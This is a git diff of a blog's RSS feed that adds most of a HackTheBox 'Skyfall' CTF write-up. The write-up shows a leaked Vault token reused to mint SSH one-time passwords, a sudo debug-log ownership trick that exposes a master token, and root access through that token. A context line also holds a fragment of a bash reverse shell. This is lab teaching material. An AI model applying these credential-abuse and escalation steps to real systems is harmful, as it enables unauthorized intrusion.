+...kup.tar.gz: 2.64 KiB / 2.64 KiB ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 39.08 KiB/s 0s
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We then unzip the file with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tar&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-xzvf&lt;/span&gt; home_backup.tar.gz 
+./
+./.profile
+./.bashrc
+./.ssh/
+./.ssh/authorized_keys
+./.sudo_as_admin_successful
+./.bash_history
+./.bash_logout
+./.cache/
+./.cache/motd.legal-displayed
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Inside the backup file, we can find these lines inside the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.bashrc&lt;/code&gt; file:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
+&lt;span class=&quot;c&quot;&gt;# set a fancy prompt (non-color, unless we know we &quot;want&quot; color)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$TERM&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in
+    &lt;/span&gt;xterm-color|&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-256color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;color_prompt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;yes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;esac&lt;/span&gt;
+
+&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;VAULT_API_ADDR&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://prd23-vault-internal.skyfall.htb&quot;&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;VAULT_TOKEN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE&quot;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;step-2---getting-foothold&quot;&gt;&lt;a href=&quot;#step3-foothold&quot;&gt;&lt;/a&gt;Step 2 - Getting foothold&lt;/h2&gt;
+
+&lt;p&gt;With the HashiCorp vault endpoint and vault key, we can get foothold by generating an ssh OTP (One-Time Password). First, we must install HashiCorp vault in our machine. I use Arch Linux, so I installed it with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo snap install vault&lt;/code&gt;. Looking at vault’s &lt;a href=&quot;https://developer.hashicorp.com/vault/docs/commands&quot;&gt;documentation&lt;/a&gt;, we see that we need to set two variables: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VAULT_TOKEN&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VAULT_ADDR&lt;/code&gt;. To do so, we run:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;VAULT_TOKEN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE&quot;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;VAULT_ADDR&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://prd23-vault-internal.skyfall.htb&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And then check if everything is running with:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/skyfall13.png&quot; alt=&quot;vault status&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Don’t forget to add this new host to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; file. To create a ssh OTP, we need a OTP key. We can list OTP keys using:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vault list ssh/roles
+Keys
+&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
+admin_otp_key_role
+dev_otp_key_role
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We cannot use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin_otp_key_role&lt;/code&gt; key, as it gives us permission denied:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/skyfall-comp.png&quot; alt=&quot;admin otp key cannot be used&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;But we can use the other key. With it, we write an ssh OTP with the following command:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/skyfall14.png&quot; alt=&quot;otp&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Don’t forget to provide the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;username&lt;/code&gt; flag, otherwise you will be given the username &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nobody&lt;/code&gt;, which is not sshable. To successfully ssh, we run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh askyy@&amp;lt;machine-ip&amp;gt;&lt;/code&gt; and provide the OTP as password:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh askyy@10.129.15.193
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;askyy@10.129.15.193&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Password: 
+Welcome to Ubuntu 22.04.3 LTS &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GNU/Linux 5.15.0-92-generic x86_64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+ &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Documentation:  https://help.ubuntu.com
+ &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Management:     https://landscape.canonical.com
+ &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Support:        https://ubuntu.com/pro
+
+This system has been minimized by removing packages and content that are
+not required on a system that &lt;span class=&quot;nb&quot;&gt;users &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;not log into.
+
+To restore this content, you can run the &lt;span class=&quot;s1&quot;&gt;&apos;unminimize&apos;&lt;/span&gt; command.
+askyy@skyfall:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;wc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; user.txt 
+33 user.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;step-3---system-enumeration&quot;&gt;&lt;a href=&quot;#step3-crafting-the-attack&quot;&gt;&lt;/a&gt;Step 3 - System enumeration&lt;/h2&gt;
+
+&lt;p&gt;Root was super simple. First, we run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt; and check the following:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;askyy@skyfall:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;askyy on skyfall:
+    env_reset, mail_badpass, &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/snap/bin, use_pty
+
+User askyy may run the following commands on skyfall:
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL : ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /root/vault/vault-unseal &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /etc/vault-unseal.yaml &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-vhd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL : ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /root/vault/vault-unseal &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /etc/vault-unseal.yaml
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Let’s run this binary as root and see what happens:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;askyy@skyfall:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /root/vault/vault-unseal &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /etc/vault-unseal.yaml
+&lt;span class=&quot;o&quot;&gt;[&amp;gt;]&lt;/span&gt; Checking seal status
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Vault sealed: &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Note that nothing happened. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt; tells us that we can also use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-v -h -d&lt;/code&gt; flags, so let’s try &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-h&lt;/code&gt; first:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;askyy@skyfall:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /root/vault/vault-unseal &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /etc/vault-unseal.yaml &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt;
+Usage:
+  vault-unseal &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;OPTIONS]
+
+Application Options:
+  &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;--verbose&lt;/span&gt;        &lt;span class=&quot;nb&quot;&gt;enable &lt;/span&gt;verbose output
+  &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;--debug&lt;/span&gt;          &lt;span class=&quot;nb&quot;&gt;enable &lt;/span&gt;debugging output to file &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;extra logging&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;--config&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;PATH    path to configuration file
+
+Help Options:
+  &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;--help&lt;/span&gt;           Show this &lt;span class=&quot;nb&quot;&gt;help &lt;/span&gt;message
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So we can run verbose and debug mode. Let’s try them out, first with  verbose:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;askyy@skyfall:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /root/vault/vault-unseal &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /etc/vault-unseal.yaml &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Reading: /etc/vault-unseal.yaml
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] Security Risk!
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] Master token found &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;config: &lt;span class=&quot;k&quot;&gt;****************************&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&amp;gt;]&lt;/span&gt; Enable &lt;span class=&quot;s1&quot;&gt;&apos;debug&apos;&lt;/span&gt; mode &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;details
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Found Vault node: http://prd23-vault-internal.skyfall.htb
+&lt;span class=&quot;o&quot;&gt;[&amp;gt;]&lt;/span&gt; Check interval: 5s
+&lt;span class=&quot;o&quot;&gt;[&amp;gt;]&lt;/span&gt; Max checks: 5
+&lt;span class=&quot;o&quot;&gt;[&amp;gt;]&lt;/span&gt; Checking seal status
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Vault sealed: &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This tells us that this command is leaking a vault master token, and we need to run it with debug mode:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;askyy@skyfall:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /root/vault/vault-unseal &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /etc/vault-unseal.yaml &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Reading: /etc/vault-unseal.yaml
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] Security Risk!
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Found Vault node: http://prd23-vault-internal.skyfall.htb
+&lt;span class=&quot;o&quot;&gt;[&amp;gt;]&lt;/span&gt; Check interval: 5s
+&lt;span class=&quot;o&quot;&gt;[&amp;gt;]&lt;/span&gt; Max checks: 5
+&lt;span class=&quot;o&quot;&gt;[&amp;gt;]&lt;/span&gt; Checking seal status
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Vault sealed: &lt;span class=&quot;nb&quot;&gt;false
+&lt;/span&gt;askyy@skyfall:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;debug.log  user.txt
+askyy@skyfall:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;debug.log 
+&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt;: debug.log: Permission denied
+askyy@skyfall:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; debug.log 
+&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt; 1 root root 590 Feb  5 05:17 debug.log
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;We have permission denied here, because the file is owned by root and only root can read and write. However, what if the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;debug.log&lt;/code&gt; file already existed in the current directory, owned by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;askyy&lt;/code&gt; instead? To test this, I created a new directory and a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;debug.log&lt;/code&gt; file within it:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;askyy@skyfall:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir &lt;/span&gt;muka
+askyy@skyfall:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;muka
+askyy@skyfall:~/muka&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;touch &lt;/span&gt;debug.log
+askyy@skyfall:~/muka&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /root/vault/vault-unseal &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /etc/vault-unseal.yaml &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Reading: /etc/vault-unseal.yaml
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] Security Risk!
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Found Vault node: http://prd23-vault-internal.skyfall.htb
+&lt;span class=&quot;o&quot;&gt;[&amp;gt;]&lt;/span&gt; Check interval: 5s
+&lt;span class=&quot;o&quot;&gt;[&amp;gt;]&lt;/span&gt; Max checks: 5
+&lt;span class=&quot;o&quot;&gt;[&amp;gt;]&lt;/span&gt; Checking seal status
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Vault sealed: &lt;span class=&quot;nb&quot;&gt;false
+&lt;/span&gt;askyy@skyfall:~/muka&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; debug.log
+&lt;span class=&quot;nt&quot;&gt;-rw-rw-r--&lt;/span&gt; 1 askyy askyy 590 Feb  5 05:19 debug.log
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And now we can read the contents and find the master token inside this log!&lt;/p&gt;
+
+&lt;h2 id=&quot;step-4---privilege-escalation&quot;&gt;&lt;a href=&quot;#step3-crafting-the-attack&quot;&gt;&lt;/a&gt;Step 4 - Privilege Escalation&lt;/h2&gt;
+
+&lt;p&gt;Now that we have the master token, we go back to our local machine and use assign this token to our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VAULT_TOKEN&lt;/code&gt; variable.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;VAULT_TOKEN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;lt;token&amp;gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vault status
+Key             Value
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;             &lt;span class=&quot;nt&quot;&gt;-----&lt;/span&gt;
+Seal Type       shamir
+Initialized     &lt;span class=&quot;nb&quot;&gt;true
+&lt;/span&gt;Sealed          &lt;span class=&quot;nb&quot;&gt;false
+&lt;/span&gt;Total Shares    1
+Threshold       1
+Version         1.15.1
+Build Date      2023-10-20T19:16:11Z
+Storage Type    file
+Cluster Name    vault-cluster-746fa9de
+Cluster ID      6fc384e6-b108-1b05-2825-1de249607986
+HA Enabled      &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;With this token we can create a OTP for the root user by running the following command:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; vault write ssh/creds/admin_otp_key_role &lt;span class=&quot;nv&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10.129.15.193 &lt;span class=&quot;nv&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;root
+Key                Value
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;                &lt;span class=&quot;nt&quot;&gt;-----&lt;/span&gt;
+lease_id           ssh/creds/admin_otp_key_role/3zvgndWlUB1ZoeD0T19lmgTg
+lease_duration     768h
+lease_renewable    &lt;span class=&quot;nb&quot;&gt;false
+&lt;/span&gt;ip                 10.129.15.193
+key                24d68169-218f-f65c-7c22-0f4d7efef1c2
+key_type           otp
+port               22
+username           root
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now, we ssh as root:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/skyfall15.png&quot; alt=&quot;root shell&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Granting us the root shell!&lt;/p&gt;
+
+&lt;h1 id=&quot;conclusion&quot;&gt;&lt;a href=&quot;#conclusions&quot;&gt;&lt;/a&gt;Conclusion&lt;/h1&gt;
+
+&lt;p&gt;In this CTF, we learned a lot about MinIO’s storage and HashiCorp vault. We were able to bypass a 403 page at http://demo.skyfall.htb to discover a S3 bucket MinIO’s storage endpoint, which we communicated with it using MinIO Client. There, we found a backup file containing another endpoint, now corresponding to HashiCorp Vault, and a Vault Token. This token was used to create a OTP that could log us in as the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;askyy&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;After that, we escalated our privileges using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt; and abusing file ownership to read the contents of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;debug.log&lt;/code&gt; file generated by the only command we could run as root. Inside the file, we found another vault token, but this one was a master token.&lt;/p&gt;
+
+&lt;p&gt;Finally, with the master token, we were able to create a OTP for the root user, which gave us access to the root shell.&lt;/p&gt;
+
+&lt;p&gt;Lot of action, indeed!&lt;/p&gt;
+
+&lt;p&gt;I hope you liked this write-up and learned something new. As always, don’t forget to do your &lt;strong&gt;research!&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/&quot;&gt;Go back&lt;/a&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Sun, 04 Feb 2024 00:00:00 -0300</pubDate>
+        <link>http://localhost:4000//skyfall-htb</link>
+        <link href="http://localhost:4000/skyfall-htb"/>
+        <guid isPermaLink="true">http://localhost:4000/skyfall-htb</guid>
+      </item>
+    
+      <item>
         <title>Analysis - HackTheBox</title>
         <description>&lt;h1 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#intro&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;
 
@@ -651,7 +1045,7 @@ Mode                LastWriteTime         Length Name
 &lt;p&gt;&lt;a href=&quot;/&quot;&gt;Go back&lt;/a&gt;&lt;/p&gt;
 
 </description>
-        <pubDate>Wed, 24 Jan 2024 00:00:00 +0000</pubDate>
+        <pubDate>Wed, 24 Jan 2024 00:00:00 -0300</pubDate>
         <link>http://localhost:4000//analysis-htb</link>
         <link href="http://localhost:4000/analysis-htb"/>
         <guid isPermaLink="true">http://localhost:4000/analysis-htb</guid>
@@ -1051,7 +1445,7 @@ root
 &lt;p&gt;&lt;a href=&quot;/&quot;&gt;Go back&lt;/a&gt;&lt;/p&gt;
 
 </description>
-        <pubDate>Thu, 18 Jan 2024 00:00:00 +0000</pubDate>
+        <pubDate>Thu, 18 Jan 2024 00:00:00 -0300</pubDate>
         <link>http://localhost:4000//friendzone-htb</link>
         <link href="http://localhost:4000/friendzone-htb"/>
         <guid isPermaLink="true">http://localhost:4000/friendzone-htb</guid>
@@ -1610,7 +2004,7 @@ bash -c &apos;&lt;/span&gt;bash &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;
 &lt;p&gt;&lt;a href=&quot;/&quot;&gt;Go back&lt;/a&gt;&lt;/p&gt;
 
 </description>
-        <pubDate>Tue, 16 Jan 2024 00:00:00 +0000</pubDate>
+        <pubDate>Tue, 16 Jan 2024 00:00:00 -0300</pubDate>
         <link>http://localhost:4000//monitored-htb</link>
         <link href="http://localhost:4000/monitored-htb"/>
         <guid isPermaLink="true">http://localhost:4000/monitored-htb</guid>
@@ -1968,7 +2362,7 @@ user on the website. We managed to successfully exploit the Server Side Template
 &lt;p&gt;&lt;a href=&quot;/&quot;&gt;Go back&lt;/a&gt;&lt;/p&gt;
 
 </description>
-        <pubDate>Sat, 13 Jan 2024 00:00:00 +0000</pubDate>
+        <pubDate>Sat, 13 Jan 2024 00:00:00 -0300</pubDate>
         <link>http://localhost:4000//goodgames-htb</link>
         <link href="http://localhost:4000/goodgames-htb"/>
         <guid isPermaLink="true">http://localhost:4000/goodgames-htb</guid>
@@ -2080,7 +2474,7 @@ End of assembler dump.
 &lt;p&gt;&lt;a href=&quot;/&quot;&gt;Go back&lt;/a&gt;&lt;/p&gt;
 
 </description>
-        <pubDate>Mon, 08 Jan 2024 00:00:00 +0000</pubDate>
+        <pubDate>Mon, 08 Jan 2024 00:00:00 -0300</pubDate>
         <link>http://localhost:4000//flag-pwnable</link>
         <link href="http://localhost:4000/flag-pwnable"/>
         <guid isPermaLink="true">http://localhost:4000/flag-pwnable</guid>
@@ -2234,7 +2628,7 @@ AAAAAAAAAAAAA
 &lt;p&gt;&lt;a href=&quot;/&quot;&gt;Go back&lt;/a&gt;&lt;/p&gt;
 
 </description>
-        <pubDate>Sun, 07 Jan 2024 00:00:00 +0000</pubDate>
+        <pubDate>Sun, 07 Jan 2024 00:00:00 -0300</pubDate>
         <link>http://localhost:4000//bof-pwnable</link>
         <link href="http://localhost:4000/bof-pwnable"/>
         <guid isPermaLink="true">http://localhost:4000/bof-pwnable</guid>
@@ -2698,7 +3092,7 @@ a033160985b82a79d7188f9c1974a8fc
 &lt;p&gt;&lt;a href=&quot;/&quot;&gt;Go back&lt;/a&gt;&lt;/p&gt;
 
 </description>
-        <pubDate>Sat, 06 Jan 2024 00:00:00 +0000</pubDate>
+        <pubDate>Sat, 06 Jan 2024 00:00:00 -0300</pubDate>
         <link>http://localhost:4000//remote-htb</link>
         <link href="http://localhost:4000/remote-htb"/>
         <guid isPermaLink="true">http://localhost:4000/remote-htb</guid>
